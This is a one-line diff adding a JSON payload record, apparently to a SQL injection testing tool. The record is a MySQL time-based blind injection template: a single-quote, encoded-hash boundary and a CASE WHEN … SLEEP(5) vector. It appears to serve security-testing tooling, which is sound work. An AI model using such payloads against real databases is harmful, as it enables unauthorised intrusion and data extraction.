@@ -1,0 +1,1 @@
+{"dbms": "mysql", "technique": "time", "boundary": {"prefix": "'%23", "suffix": "", "type": "single-enc-hash"}, "vector": "{B} AND CASE WHEN ({T}) THEN SLEEP(5) ELSE SLEEP(0) END", "comment": "mysql time: single+enc hash"}
